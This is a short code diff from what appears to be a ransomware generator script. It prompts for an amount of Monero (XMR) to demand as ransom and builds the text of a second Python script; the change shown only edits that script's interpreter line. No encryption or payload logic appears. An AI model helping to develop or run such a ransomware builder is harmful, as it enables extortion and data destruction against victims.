@@ -24,7 +24,7 @@ with open(wallet_address, "r") as thewallet:
 quantity = input("How much XMR would you like to ransom? ")
 
 text = f"""
-#!/usr/bin/python
+#!/usr/bin/python3.9
 import base64
 import os
 import shutil
